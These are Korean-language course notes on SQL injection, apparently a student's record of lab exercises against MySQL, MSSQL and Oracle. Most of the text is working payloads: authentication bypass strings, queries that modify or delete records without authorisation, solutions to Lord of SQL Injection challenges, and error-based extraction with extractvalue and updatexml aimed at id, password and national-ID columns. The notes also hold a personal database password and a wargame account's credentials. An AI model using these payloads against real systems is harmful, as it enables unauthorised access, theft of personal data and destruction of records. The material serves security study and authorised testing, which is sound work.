------------------------------------취약점 점검 방법론---------------------------

1. APMSetup 설치
 1) APMSetup 설치 
 apmsetup 검색하여 다운로드
 
 2) Mysql password 변경 -> apmsetup
>select user();
>update mysql.user set password=password('gh1015') where user='root';
>flush privileges;

 3) php.ini 
C:\APM_Setup
php.ini 파일에서 magic_quotes-gpc=On -> Off로 변경 후 아파치 재부팅

C:\APM_Setup\Server\Apache\bin\ApacheMonitor.exe

2. ORACLE 설치 및 PHP 연동
 1) ORACLE 다운로드 및 설치 
검색 : oracle download express 

 2) ORACLE + PHP 연동 및 테스트 

---------------------------------------취약점 점검 방법론-------------------------------------
취약점 분석 : 에러 유/무 확인, 취약점 유/무 확인, 조건 구문 완성
 Step12) 에러 유/무 확인 - DBMS 에러 발생으로 DBMS 종류 파악
 숫자입력창
  select * from board where idx=192 //올바른 구문
  select * from board where idx=a X //올바르지 않은 구문
  
 문자 입력창
  select * from member where id='crehacktive' O //올바른 구문
  select * from member where id='crehack'tive' X //올바르지 않은 구문
  
 Step2-1) 취약점 유/무 확인 - 데이터 타입 : 문자형
  select * from member where id='crehacktive' //O
  select * from member where id='crehack'||'tive' //ORACLE
  select * from member where id='crehack'a'tive' //MSSQL
  select * from member where id='crehack'+'tive' //MYSQL(+ = %2B)
  
 Step2-2) 취약점 유/무 확인 - 데이터 타입 : 숫자형
  select * from board where idx=192 //O
  select * from board where idx=192-1 //점검 구문
  select * from board where idx=192+3 //점검 구문(192%2b3)
   
 Step2-2) 취약점 유/무 확인 - 테이블 (tbname, tb_name 등)
  select * from board_notice ORDER BY idx desc //사용자 입력 : board_notice
  select * from board_notice where 1=1 ORDER BY idx desc //사용자 입력 : where 1=1-- 데이터 조회 성공
  select * from board_notice where 2=1 ORDER BY idx desc //사용자 입력 : where 2=1 데이터 조회 실패 
  
  http://localhost.jsp?tbname=notice+where+1=1, 1=2
  
 Step2-3) 취약점 유/무 확인 - 컬럼(WHERE 절)
  select * from board_notice WHERE [title] like %% //[]는 사용자 입력, 데이터 조회 성공
  select * from board_notice WHERE [1] like %% //숫자, 데이터 조회 성공
  select * from board_notice WHERE [a] like %%//문자, 데이터 조회 실패 
 
  http://localhost.jsp?search_column=1, a
  
 Step2-4) 취약점 유/무 확인 - 컬럼(ORDER BY 절)  
  select * from board_notice ORDER BY [idx] desc //데이터 조회 성공, 사용자 입력 값 
  select * from board_notice ORDER BY [1] desc //데이터 조회 성공, 사용자 입력 값 : 1이상의 숫자 값
  select * from board_notice ORDER BY [a] desc //에러발생 : 데이터 조회 실패 
   
  http://localhost.jsp?sort_column=1 //select * from board_notice ORDER BY 1 desc
  http://localhost.jsp?sort_column=a //select * from board_notice ORDER BY a desc
   
 Step2-5) 취약점 유/무 확인 - 키워드(ORDER BY 절) 
  select * from board_notice ORDER BY idx [desc] //데이터 조회 성공, 사용자 입력 값 
  select * from board_notice ORDER BY idx[,1] //데이터 조회 성공, 사용자 입력 값 : 1이상의 숫자 값
  select * from board_notice ORDER BY idx [a] //에러발생 : 데이터 조회 실패
  
  http://website.co.kr/boardList.jsp?sort=,1 //select * from board_notice ORDER BY idx,1 -> sort파라미터에 [,1] 입력 
  http://website.co.kr/boardList.jsp?sort=a //select * from board_notice ORDER BY idx a -> 에러반환

SQL 인젝션 구문 종류 
 In-Line Query : select * from ask where idx=[192 and 1=1] and user_id='hacker'
 Terminating Query : select * from ask where [idx=192 and 1=1--] and user_id='hacker'
 Stack Query : select * from ask where idx=[192;delete from ask--] and user_id='hacker' //MSSQL 환경에서만 가능함
   
 Step3-1) 조건 구문 완성 - 데이터 타입 : 문자형 
  취약 우뮤 확인 후 조건 구문 완성해야됨
  In-line Query : select * from member where user_id='[hacker' and 1=1 and '1'='1]'
  Terminating Query : select * from member where user_id='[hacker' and 1=1--]'
   
  http://website.co.kr/mypage.jsp?id=[hacker' and 1=1 and '1'='1] // select * from member where id='hacker' and '1'='1'
  http://website.co.kr/mypage.jsp?id=[hacker' and 1=1--] //select * from member where id='hacker' and 1=1--'
 
 Step3-2) 조건 구문 완성 - 데이터 타입 : 숫자형
  In-line Query : select * from ask where idx=[192 and 1=1] and and user_id='hacker'
  Terminating Query : select * from ask where idx=[192 and 1=1--] and user_id='hacker'
  
  http://website.co.kr/boardView.jsp?idx=[192+and+1=1] // select * from board where idx=[192 and 1=1]
  http://website.co.kr/boardView.jsp?idx=[192+and+1=1--] // select * from board where idx=[192 and 1=1--]
   
  Terminating Query 사용이 되지 않고, In-line Query 사용시 논리 연산자 사용이 되지 않을 경우 -> 연결 연산자와 CASE WHEN 구문 
 
 Step3-3) 조건 구문 완성 - CASE WHEN 구문 활용(1)
  In-line Query
  select * from ask WHERE idx=[(case when 1=1 then 9 else 3 end)]//9데이터 조회 성공
  
  Select * FROM member WHERE user_id=["||(case when 1=1 then 'hacker' else 'test' end)||"] //'hacker' 데이터 조회 성공
  
 Step3-3) 조건 구문 완성 - CASE WHEN 구문 활용(2)
  Query
  SELECT * FROM board ORDER BY [case when 1=1 then 1 else 2 end)] desc
  
  SELECT * FROM board ORDER BY [(case when 1=1 then idx else title end)] desc
 
 
 ----------------------------실습 2-1 취약점 분석 실습-----------------------------
 2-2 검색기능에 대한 올바른 취약점 점검 방법, 2-3검색 기능의 컬럼 파라미터에 대한 올바른 취약점 점검 
 
취약점 점검

+(%2b), ||(%7c%7c), '(%27), "(%22), %(%25), #(%23)

1) 에러 유/무 확인
 *MYSQL 
 검색창 : te' 'st(참), te'a'st(거짓) 구문 삽입하여 참거짓 확인 
 
 *MSSQL 
 검색창 : ' 삽입 // 에러구문에 문자열 'order by idx desc'의 따옴표가 짝이 맞지 않습니다. 라고 뜨면 거의 인젝션됨
 검색창 : '+', te'+'st, t'+'4 //+는 공백
 
 *ORACLE
 검색 : ' ', '+', 'f'//에러
 검색 : '||',tes'||'t //정상출력
 테이블 : tbname=all_tables
 WHERE절 : tbname=ex_member%20where%201=1
           tbname=ex_member%20where%201=2
           
           
2) 취약점 유/무 확인
search_type=1=1+and+title&keyword=test //참
search_type=1=2+and+title&keyword=test //거짓
search_type=(case+when+1=1+then+'test'+else+'ha'+end)&keyword=test
search_type=(case+when+2=1+then+'test'+else+'ha'+end)&keyword=test

정상 SQL : select * from board where title like '%test%'
비정상 SQL : select * from board where 'test' like '%test%'

'te'%2b'st' => 

구문(1) : select * from board where 1=1 and title like '%test%' => TRUE
          select * from board where 1=2 and title like '%test%' => FALSE

구문(2) : select * from board where (case when 1=1 then 'test' else 'ha' end) like '%test%'
          select * from board where (case when 1=2 then 'test' else 'ha' end) like '%test%'

3) 조건 구문 완성
 
 
 *MYSQL 
 검색창 : te' 'st(참), te'a'st(거짓) 구문 삽입하여 참거짓 확인
 
 localhost/board/mysql/index.php?sort_column=(case when 1=1 then idx else title end)&sort=desc //참구문
 
 localhost/board/mysql/index.php?sort_column=(case when 1=2 then idx else title end)&sort=desc //거짓구문
 
 localhost/board/mysql/index.php?sort_column=idx&sort=asc //정상출력
 
 localhost/board/mysql/index.php?sort_column=idx&sort=,1 //asc,1 정상 출력 (asc가 생략됨)
 
 localhost/board/mysql/index.php?sort_column=&sort=(case when 1=1 then idx else title end) // order by값의 컬럼이 null이면 asc가 디폴트로 설정됨
                                                                                             , idx 값이 기본으로 세팅되는 어플리케이션도 있음
 *MSSQL
 
 검색창 : ' 삽입 // 에러구문에 문자열 'order by idx desc'의 따옴표가 짝이 맞지 않습니다. 라고 뜨면 거의 인젝션됨
 검색창 : '+', te'+'st, t'+'4 //+는 공백
 
 localhost/board/mssql/index.php?idx=6-1 //6-1, 7-2 되면 인젝션됨
 
 localhost/board/mssql/index.php?idx=5 and 1=1 //5 and 1=2
 
 localhost/board/mssql/index.php?idx=(case when 1=1 then 5 else 1 end)
 
 localhost/board/mssql/index.php?idx=(case when 1=1 then idx else title end)&sort=desc
 
 localhost/board/mssql/index.php?idx=(case when 1=1 then idx else title end)&sort=desc //message : nvarchar 값 'test2'를 데이터 형식 int로 변환하지 못함, mssql은 앞은 int, 뒤는 nvarchar형식인데 두개형식이 안맞으면 에러가 발생함
 

 *ORACLE
 
 검색 : ' ', '+', 'f'//에러
 검색 : '||',tes'||'t //정상출력
 
 localhost/board/oracle/view.php?idx=2||5 //참
 
 localhost/board/oracle/view.php?idx=2a5 //거짓
   
 localhost/board/oracle/view.php?idx=25 and 1=1, idx=25 and 1=2
 
 localhost/board/oracle/view.php?idx=(case when 1=1 then 25 else 26 end) //참
 
 localhost/board/oracle/view.php?idx=(case when 1=2 then 25 else 26 end) //거짓
 
 localhost/board/oracle/index.php?sort_column=(case when 1=1 then idx else title end)&sort=desc //자료형이 일치하지 않아 에러발생
 
  localhost/board/oracle/index.php?sort_column=(case when 1=1 then writer else 'a' end)&sort=desc // 문자열로 동일하게 자료형을 만들어서 일치시킴
  
 --------------------------------실습 2-4 Prepared Statement 환경에서의 테이블 파라미터 점검---------------------
?는 플레이스 홀더
id=guest%27, gue'||'st //이렇게 연결연산자가 안되는것은 안된다고 봐야함
 
http://127.0.0.1:8888/security/example.jsp?tbname=ex_member
 
테이블 : tbname=all_tables // all_tables는 오라클 테이블 조회명령어
WHERE절 : tbname=ex_member where 1=1 //1=1부분에 조건구문이 들어가면됨
          tbname=ex_member where 1=1-- //
          tbname=(select * from ex_member where 1=1)&id=guest
소스코드
...
String sql = "SELECT * FROM " + tbname + " WHERE id = ?";

http://127.0.0.1:8888/security/example.jsp?tbname=ex_member where 1=1-- WHERE&id=guest //id 파라미터가 없어지니까 에러발생
 
http://127.0.0.1:8888/security/example.jsp?tbname=ex_member where id=?--&id=guest //id 파라미터를 만들어줌
SELECT * FROM ex_member where id=?-- WHERE id = ? // 이렇게하면 되지않을까, id라는 파라미터와 컬럼명은 90%일치 유추해야됨
http://127.0.0.1:8888/security/example.jsp?tbname=ex_member where 1=1 and id=?--&id=guest//참구문을 추가해서 조건 구문 완성
   
@위처럼 컬럼을 유추해서 끼워넣는 방법비추, ?(플레이스홀더)를 무시하고 서브쿼리를 넣는 방법 강추
자바웹환경에서 이러한 경우가 확률이 높기때문에 테이블 파라미터에서 인젝션이 발생이 된다면 

<아래 두개 쿼리문은 동일함>
SELECT * FROM ex_member WHERE id=?
SELECT * FROM (select * from ex_member) WHERE id=?

URL에 입력
http://127.0.0.1:8888/security/example.jsp?tbname=(select%20*%20rom%20ex_member)&id=guest //서브쿼리를 활용해서 조건구문 완성까지 가능
http://127.0.0.1:8888/security/example.jsp?tbname=(select%20*%20from%20ex_member%20where%1=1)&id=guest


--------------------------------------------인증 우회 공격 기법--------------------------------------

 - 인증우회 공격이란 무엇인가?
로그인 ID/PW 페이지 인증 우회

예시 1) 
id=admin' or '1'='
$query="select * from member where id='admin' or ''='' and pw='{$pw}'";

MYSQL 주석 문자 : --, #
[공백]--[공백]

id=admin' -- //--앞뒤에 공백이있어야 됨(admin'+--+)

예시 2)
id=admin'# //#도 공백으로 인식됨
$query="select * from member where id='admin'#' and pw='{$pw}'"; //#뒤부터 주석처리됨

예시 3)
검색창 : ' or 1=1 or '1'='1
$query="select * from member where id='' or 1=1 or '1'='1' and pw='{$pw}'";

예시 4)
검색창 :' or 1=1#, ' or 1=1 -- 
$query="select * from member where id='' or 1=1 -- ' and pw='{$pw}'";

[의문점]
왜 admin으로 로그인이 될까? DB에 있는 첫번째 계정이 로그인됨

*****인증우회를 통한 게시글 무단 열람 

비번창 : ' or '1'='1
select * from tb_board where idx=6 and password='' or '1'='1'
select * from tb_board where idx=6 and password='' or idx=6--' //F or T = T

*****인증우회를 통한 게시글 무단 수정/삭제

 - 수정
1) UPDATE 구문의 WHERE 절에 password 삽입되어 검증
=>' or 1=1-- //이러면 대참사남 
=>' or idx=7 //O (올바른 구문)
update board set title=.., content=..., date=... WHERE idx=7 and password='' or 1=1--' //이러면 장애남
update board set title=.., content=..., date=... WHERE idx=7 and password='' or idx=7--' //이렇게 해주면됨

2) UPDATE 구문 실행 전 password 검증 
=>' or 1=1-- //X (옳지 않은 구문)
=>' or idx=7-- //O (올바른 구문)
select * from board where idx=7 and password=''
update board set title=.., content=..., date=... WHERE idx=7

 - 삭제
3) DELETE 구문의 WHERE 절에 password 삽입되어 검증
비번창 : ' or idx=7--' //O (올바른 구문)
update board set title=.., content=..., date=... WHERE idx=7 and password='' or idx=7--'
delete from board where idx=7 and password='' or idx=7--'

4) DELETE 구문 실행 전 password 검증 
비번창 : ' or idx=7-- //O (올바른 구문)
select * from board where idx=7 and password=''

update board set title=.., content=..., date=... WHERE idx=7
delete from board whree idx=7





--------------------------------Lord of SQL Injection 워게임 실습 사이트---------------------
   
계정 생성 : kanesbg / rlfl1015! / kanesbg@naver.com 

 - 인증우회 기법
 - 데이터 조회 기법

1. ?id=' or 1=1%23, ?id=' or 1=1--%20, ' or 1=1 or '2'='
   ?pw=' or '1'='1 //인라인방식, ?pw=' or 1=1%23//터미네이팅 방식, 
   
2. ?pw=') or 1=1%23, ') or id='admin'%23 //앞에 md5(' 있을경우
   
3. ?no=1 or id='admin' // ' " ` 필터링되있음
MySQL에서 '(싱글쿼터)를 우회하는 방법
hex나 char를 이용하면 됨

>select hex('admin')
616460696E

>select 0x616460696E; //admin
select id from prob_goblin where id='guest' and no=1 or id=0x61646D696E //오답, guest and 1 = 참이므로 뒤에 or를 진행하지 않고 1번이 출력됨
select id from prob_goblin where id='guest' and no=2 or id=0x61646D696E //정답, guest and 2 = 거짓이므로 뒤에 or문이 진행됨(id='admin')
   
--, #은 해당라인만 주석처리됨
/**/은 멀티라인 주석이되는데 붙이면 공백이됨

?pw='%0cor%0cid='admin'%23 //내가한 방법
?pw='or/**/id='admin //'(싱글쿼터)와 or 사이에 붙여도됨

mysql or과 and 우회법
or => ||
and => &&

?pw='|| id='admin 

인증 우회 기법은 기초이고 실무에서도 발생횟수가 적지만
데이터 조회 공격을 하기위해서는 반드시 쿼리문을 알아야만 데이터 조회공격을 할 수있음
   
   
------------------------------데이터 조회공격 상세 프로세스---------------------

Phase1 취약점 분석
 1) 에러 유/무 확인
 2) 취약점 유/무 확인
 3) 조건 구문 완성

Phase2 환경 분석
 1) DBMS 파악
 2) 공격 적합성 검토
 
Phase3 공격기법 선택
 1) Error-Based
 2) Blind-Based
 3) Union-Based
 4) Out-Of-Band
 
Phase4 공격 검증
 1) 공격 검증

Phase5 데이터 조회 공격
 1) 기본 정보 목록화 
 2) 메타 데이터 목록화
 3) 데이터 목록화
   
------------------------------환경 분석---------------------   
Step 1) DBMS 파악 - 에러, 연결연산자, 함수, 더미

DBMS별 차이점 
함수
데이터 사전
순차적 레코드 출력 

1. 에러를 통한 DBMS 파악 

2. 연결 연산자를 통한 DBMS 파악(강추)
Oracle, DB2, Tibero, CUBRID || //1||91 -> 192
MSSQL + // ?idx=192 and 'test'='te'+'st' => ?idx=192+and+'test'='te'%2b'st'
MySQL 공백 

3. 함수를 통한 DBMS 파악
Oracle - sysdate, substr(), length()
MSSQL - getdate(), substring(), len()
MYSQL - now(), mid(), length(), concat() 


4. 더미 테이블을 통한 DBMS 파악
Oracle
select 1 from dual 

DB2
select 1 from sysibm.sysdummy1 

ex) ?idx=192
    ?idx=(select 192 from dual) //Oracle 
	?idx=(select 192 from sysibm.sysdummy1 ) //DB2 
	?idx=test' and 1=(select 1 from dual)-- //' and 1=1--
	?idx=test' and 1=(select 1 from sysibm.sysdummy1)-- //DB2 

Step 2) 공격 적합성 검토 
DBMS 에러 출력 유/무 파악 - ERROR-BASED

DB 데이터 웹 페이지 출력 유/무 파악 -UNION-BASED
   
MYSQL   
?idx=7 and min('test',1,1)='t'
?idx=7 and 1=1
?idx=7 and 'test'='te' 'st'

MSSQL
검색 : tes' 't, te'+'st
?idx=5 and 'te'%2b'st'='test'
?idx=(select 5 from dual) //oracle인지 확인
?idx=5 and 'te'%2b'st'='test'
?idx=5 and length('test')=4 //거짓
?idx=5 and len('test')=4 //참

ORACLE
검색 : tes'||'t
검색 : t'||(case when 1=1 then 'e' else 'a' end)||'st //참이면 test검색, 거짓이면 tast
?idx=2||5 //25로 출력 

?idx=25 and 'test'='te'||'st'
?idx=(select 25 from dual)
?idx=(select 25 from dual)' //에러확인

   
------------------------------데이터 조회 공격을 위한 순차적 레코드 출력의 이해와 필요성---------------
>select length('test');
>select length((select 'test'));
>select length((select table_name from information_schema.tables)); //에러발생함 두개이상의 레코드를 가지고 있음

--------------------------------MYSQL 순차적 레코드 출력------------------
1. 순차적 접근
information_schema DB 안에 schemata, tables, columns 라는 테이블 세개가 있음 

DB명
information_schema => schemata => schema_name DB명

>select schema_name from information_schema.schemata; //DB명, schemata => schema_name


tables명
information_schema => tables => table_name table명 ////tables / columns => table_schema는 DB명

>select table_name from information_schema.tables where table_schema='board'; //table_name안에 members 출력


columns명
information_schema => columns => column_name cloumn명 // table_schema는 DB명, table_name도 있음

>select column_name from information_schema.columns where table_schema='board' and table_name='members'


>select id, pw from login_example.member;

테이블 / 컬럼 
테이블 : mem, user, file, session, employee, admin...
컬럼 : id, pw, jumin, ssn, admin, card

select table_name, cloumn_name from information_schema.columns where table_schema='board' and column_name like '%id%'

2. 비 순차적 접근
>select table_schema, table_name from information_schema.tables where table_name like '%mem%';

>select table_schema, table_name from information_schema.tables where table_schema='login_example' and table_name like '%mem%'; //현재 DB에서 mem이라는 테이블 찾기

>select table_name from information_schema.tables where table_schema='login_example' and table_name like '%mem%';

>select column_name from information_schema.columns where table_schema='login_example' and table_name='member'; //DB내 테이블의 컬럼 조회하기

>select id, pw from login_example.member;

>select column_name from information_schema.columns where table_schema='login_example' and column_name like '%id%'; //현재 DB 내에 id문자가 포함된 컬럼 찾기

>select table_name, column_name from information_schema.columns where table_schema='login_example' and column_name like '%id%';
>select id from login_example.member;
>select column_name from information_schema.columns where table_schema='login_example' and table_name='member';


--------------------------------MSSQL 순차적 레코드 출력------------------   
>select top 1 name from sysdatabases //1 ~ 5, top 절연계 방법

 * MSSQL 순차적 레코드 출력 방법
방법 1) 정렬(ORDER BY)
 - 상위 SELECT 문의 TOP 절의 숫자는 무조건 "1"
 - 서브쿼리 SELECT 문의 TOP 절은 1부터 시작
 - 상위, 서브쿼리의 정렬 방식은 다르게 설정
 => Error-based : 2005 정렬 방식 X
 
>select top 1 name from (select top 1 name from sysdatabases order by name)a order by name desc //a는 객체에 대한 명칭, from절 뒤에 오는 서브쿼리에는 별칭이 꼭붙어야됨

방법 2) NOT IN 연산자
- 상위 SELECT 문의 TOP 절의 숫자는 무조건 "1"
- 서브 쿼리 SELECT 문의 TOP 절은 0부터 시작
- 상위 SELECT문과 서브쿼리의 조건문이 같아야 함

>select top 1 name from sysdatabases where name not in('master', 'tempdb', 'model', 'msdb', 'northwind'); //이거를 아래방법 서브쿼리로 바꿈
>select top 1 name from sysdatabases where name not in(select top 0 name from sysdatabases);

방법 3) ROW_NUMBER() 함수   
- FROM절 서브쿼리 사용 시 반드시 별칭 부여
- ROW_NUMBER() 함수에 별칭 부여
- ROW_NUMBER() over(order by [column] [asc/desc])

>select name from (select row_number() over(order by name) num, name from sysdatabases)a where a.num=1  



  ************* 메타데이터 목록화**********
MySQL - db.table
MSSQL - db.schema.table
  	db..table //select * from master..sysdatabases
	db.sys.databases

object_id() : 개체에 대한 id 값 반환(object_id), object_id('개체'), object_id('다른DB명..개체')
object_name() : 개체 id에 대한 name 값 반환(name), object_name(object_id, database_id)
=> 기본적으로 현재 데이터베이스 내에서 조회

db_id() : 데이터베이스명에 대한 id 값 반환

type
 U : 사용자 테이블
 S : 시스템 테이블
 P : 저장 프로시저
 X : 확장 저장 프로시저(Extended Stored Procedure)
 IT : 내부 테이블
 ET : 외부 테이블
 V : 뷰
 

>select * from master.sys.databases  //database의 id값 
[name]   [database_id]
master         1
tempdb	       2
model          3
msdb           4
northwind      5

>select db_name(); //현재 DB명 출력 함수

>select db_name(1); //database_id로 출력가능 
>select * from master.sys.databases where database_id=5 //위와 같음

 - 테이블 목록화
>select * from northwind.sys.objects 
//mssql은 각 데이터베이스안에 시스템 뷰가 존재함, 다른 DB를 조회할 경우에는 반드시 db명을 알아야됨

>select * from information_schema.tables where table_schema='db' //mysql

>select * from northwind.sys.objects where type='U' //사용자 테이블 목록 조회
>select name from northwind.sys.objects where type='U' //컬럼명은 name임
[name]
CustomerDemographics
Region
Employees
Categories
Customers
Shippers
Suppliers
Orders
Products
Order Details
CustomerCustomerDemo
Territories
EmployeeTerritories

 - 컬럼 목록화
>select * from northwind.sys.columns
>select name from northwind.sys.columns

>select object_id from sys.objects where name='CustomerDemographics'
[object_id]
1205579333

>select * from northwind.sys.columns where object_id=1205579333 //해당 테이블에 대한 컬럼 목록화
>select object_id, name from sys.objects where type='U' //object_id, name 출력
>select object_id, name from sys.objects where name='CustomerDemographics'

>>select * from northwind.sys.columns where object_id=(select object_id from sys.objects where name='CustomerDemographics')
  //object_id안에 서브쿼리를 넣음
>>select * from northwind.sys.columns where object_id=object_id('CustomerDemographics') 
  //object_id 번호 입력 없이 함수 object_id()를 쓰면됨
>select object_id('CustomerDemographics') //결과 확인

>select name from master.sys.columns where object_id=object_id('master..spt_monitor') //다른 DB에 대한 컬럼 목록화
>select object_id('master..spt_monitor')

>select * from sys.types //컬럼 타입 조회
>select name, type_name(system_type_id) from northwind.sys.columns where object_id=object_id('CustomerDemographics') 
 //type_name() 함수안에 system_type_id 넣으면 컬럼의 타입확인가능
[name]
CustomerTypeID	nchar
CustomerDesc	ntext 

Customers 테이블의 컬럼
CustomerID, Address, City, Phone, Fax,CompanyName, Country

 - 데이터 목록화
>select CustomerID, Address, City, Phone, Fax,CompanyName, Country from northwind..Customers


[비순차적 접근방법]
>select name from sys.objects where type='U' and name like '%shi%' //현재 데이터베이스의 테이블 목록화
>select name from sys.columns where object_id=object_id('Shippers') //컬럼 목록화
>select shipperid, companyname, phone from northwind..shippers //데이터 목록화

Q.1 사용자 테이블에 대한 컬럼 목록화를 하기 위한 SQL 구문
>select name from sys.columns where name like '%id%' //??
>select * from sys.columns where object_id in(select object_id from sys.objects where type='U') and name like '%id%'
 //사용자 테이블에 대한 컬럼명만 출력됨
 
>select object_name(object_id), name from sys.columns where object_id in(select object_id  from sys.objects where type='U') and name like '%id%' 
 //현재 DB에서 'id' 키워드를 가진 사용자 테이블과 컬럼명이 출력됨

>select object_name(object_id), name from northwind.sys.columns where object_id in(select object_id  from northwind.sys.objects where type='U') and name like '%id%' 
 //다른 DB에서 northwind DB의 'id' 키워드를 가진 사용자 테이블의 컬럼명만 조회됨

>select * from master.sys.databases; //database_id 값 확인
 [name]   [database_id]
 master        1
 northwind     5

>select object_name(object_id, 5), name from northwind.sys.columns where object_id in(select object_id  from northwind.sys.objects where type='U') and name like '%id%' 
 //다른 DB에서 northwind DB의 'id' 키워드를 가진 사용자 테이블명과 컬럼명이 조회됨, object_name(object_id, database_id), database_id 값이 5라는것을 알아내야됨
 

>select object_name(object_id, db_id('northwind')), name from northwind.sys.columns where object_id in(select object_id  from northwind.sys.objects where type='U') and name like '%id%' 
 //다른 DB에서 northwind DB의 'id' 키워드를 가진 사용자 테이블명과 컬럼명 조회 완료
 
>select a.name, b.name from sys.objects a, sys.columns b where a.object_id=b.object_id and a.type='U' 
>select a.name, b.name from sys.objects a, sys.columns b where a.object_id=b.object_id and a.type='U' and b.name like '%id%'
 //조인 구문 이용하여 id 키워드를 가진 테이블명과 컬럼명 조회 가능
 
 
 
 
--------------------------------------------ORACLE 순차적 레코드 출력---------------------------------------------
oracle은 rownum=1은 되지만 2부터는 안되므로 서브쿼리를 

>select rownum, username from all_users; //select rownum as r, username from all_users
>select rownum, username from all_users where rownum=2
>select rownum, username from all_users where rownum<2
   
>select * from (select rownum r, username from all_users)tb where tb.r=1   
>select username from (select rownum r, username from all_users)tb where tb.r=2   

  ********** 메타데이터 목록화*************
DBA_, ALL_, USER_

DBA_TABLES / DBA_TAB_COLUMNS : 데이터베이스의 모든 테이블 / 컬럼 정보(DBA 권한)
ALL_TABLES / ALL_TAB_COLUMNS : 현재 사용자가 접근 가능한 모든 테이블 / 컬럼 정보
USER_TABLES / USER_TAB_COLUMNS : 현재 사용자가 생성 / 소유하는 테이블 / 컬럼 정보

>select * from all_users; //전체 사용자명
>select distinct owner from all_tables; //현재 권한으로 접근가능한 테이블들의 사용자 목록(distinct=중복배제)
>select user from dual //현재 사용자명 조회 
>select * from all_tables where owner='HR'//현재사용자 DB에 대한 테이블 목록화, 오라클에서는 메타데이터 조회 시 대문자로 해야됨
[TABLE_NAME]
REGIONS
LOCATIONS
DEPARTMENTS
JOBS
EMPLOYEES
JOB_HISTORY
COUNTRIES

>select * from all_tab_columns where owner='HR' and table_name='REGIONS' //현재 사용자의 해당 테이블 조회
>select table_name from all_tables where owner='HR' //현재 사용자의 테이블 조회
>select table_name, column_name from all_tab_columns where owner='HR' and table_name='REGIONS' //선택한 테이블의 컬럼 목록화
[COLUMN_NAME]
REGION_ID
REGION_NAME

>select region_id, region_name from HR.REGIONS // ID, PW, NAME 등 컬럼 조회
>select table_name from all_tables where owner='HR' and table_name like '%OB%' //OB라는 키워드를 가진 테이블 조회

>select table_name from all_tables where owner in('USER1', 'USER2') and table_name like '%MEM%'
//MEM 키워드를 가진 두개의 오너에 속하는 테이블 조회

>select owner, table_name, column_name from all_tab_columns where column_name like '%ID%'
//모든 테이블의 컬럼 네임이 ID인 데이터 조회
>select table_name, column_name from all_tab_columns where owner='HR' and column_name like '%ID%'
//오너의 테이블 중에 컬럼명이 ID인 데이터만 조회


--------------------------------데이터 조회 공격의 핵심, 메타 데이터------------------    
 
[순차적 접근]
 - 장점 : 중요 정보(데이터) 놓칠 확률이 낮음.
 - 단점 : 높은 시간 소요 / 높은 트래픽 발생
 
[비순차적 접근]
 - 장점 : 낮은 시간 소요 / 낮은 트래픽 발생
 - 단점 : 중요 정보 놓칠 확률이 높음.
 

--------------------------------DBMS 별 데이터 사전------------------ 
 
MYSQL
 information_schema.schemata / information_schema.tables / information_schema.columns

MSSQL
 sysdatabases / sysobjects / syscolumns
 <MSSQL 2005 이상> sys.databases / sys.objects / sys.columns 

ORACLE 
all_tables / all_tab_columns
 
 
--------------------------------------------------ERROR-BASED 공격-----------------------------------------  
 
 - Error-based 공격 페이로드

[MYSQL]
 - PHP+MYSQL 환경에서 에러발생한 경우는 드물다
 - URL 상에서는 공백은 %20이고, MYSQL에서 공백은 +

 extractvalue(1,concat(0x01,[DATA])) //0x0a는 개행임, 1은 같은줄에 출력됨
 extractvalue(0x0a,concat(0x0a,@@version))
 
 updatexml(1,concat(0x01,[DATA],1) //data -> system_user()
 updatexml(0x0a,concat(0x0a,@@version),0x0a)
 
 (select 1 from (select count(*),concat([DATA],floor(rand(0)*2))as a from (select1 union select 2 union select 3)x group by a)x) //data->database()
 (select 1 from (select count(*),concat(@@version,floor(rand(0)*2))as a from (select 1 union select 2 union select 3)x group by a)x)
 //groupkey가 중복될 경우 에러발생
 
 1. 기본 정보 목록화 => 버전, 사용자, 현재 DB명
 @@version / version(), system_user(), database()
 
 2. 메타 데이터 목록화
 - 순차적 접근 : 데이터베이스 > 테이블 > 컬럼
 
 Step 1) 데이터베이스 목록화
 select count(*) from information_schema.schemata //데이터베이스 카운팅
 select schema_name from information_schema.schemata limit 0, 1 //DB 조회
 
 Step 2) 테이블 목록화
 select count(*) from information_schema.tables where table_schema='board' //테이블 갯수 확인
 select table_name from information_schema.tables where table_schema='board' limit 0,1 //tables 출력
 
 Step 3) 컬럼 목록화
 select count(*) from information_schema.columns where table_schema='board' and table_name='members' //DB내 해당 테이블의 컬럼 갯수 확인
 select column_name from information_schema.columns where table_schema='board' and table_name='members' limit 0,1 //컬럼명 확인
 
 Step 4) 데이터 목록화
 extractvalue(0x0a,concat(0x0a,(select+concat(id,'%23%23%23',password,'%23%23%23',jumin)+from+board.members+limit+0,1))) //'%23%23%23'는 구분하기위해서 문자#세개씀
 
 
 - 비 순차적 접근
 1) 테이블 : mem, user, session, file, admin ...
 select count(*) from information_schema.tables where table_schema='board' and table_name like '%mem%'
 select table_name from information_schema.tables where table_schema='board' and table_name like '%mem%' limit 0,1 //테이블명
 
 2) 컬럼 : id, pw, pass, jumin, ssn, card...
 select count(*) from information_schema.columns where table_schema='board' and column_name like '%jumin%' //jumin 키워드를 가진 컬럼 갯수
 extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema='board' and column_name like '%jumin%' limit 0,1),0x0a)) //jumin 키워드를 가진 컬럼명
 extractvalue(0x0a,concat(0x0a,(select concat(table_name,'%23%23%23',column_name) from information_schema.columns where table_schema='board' and column_name like '%jumin%' limit 0,1),0x0a))//jumin을 가진 테이블명과 컬럼명 조회
 
 순차적 레코드 출력
 limit 0, 1
 
 3. 데이터 목록화
 위의 DB > table > column 목록화 다음 데이터목록화 확인




[MSSQL]
 1=@@version
 1=0/@@version
 1=convert(int, version)
 

	      
데이터 조회 공격
1. 기본 정보 목록화 => 버전, 사용자, 현재 DB명
 버전 - @@version
 사용자 - system_user
 현재 DB명 - db_name()

title검색창 : test%' and 1=1 and '%'='%
 test%25'+and+1=@@version+and+'%25'='
 test%25'+and+1=system_user+and+'%25'='
 test%25'+and+1=db_name()+and+'%25'='

2. 메타 데이터 목록화
 1) 순차적 접근 > 데이터베이스 > 테이블 > 컬럼
 - 데이터 베이스 목록화
 test%25'+and+1=db_name(1)+and+'%25'=' //db_name(1~5)까지 출력
 test%25'+and+1=(select+count(*)+from+master.sys.databases)+and+'%25'='  //1=5니까 거짓 ,int형임
 test%25'+and+1='%23%23'%2bconvert(char.(select+count(*)+from+master.sys.databases))%2b'%23%23'+and+'%25'=' //int형을 char로 변환, ##5 ###
 
 - 테이블 목록화
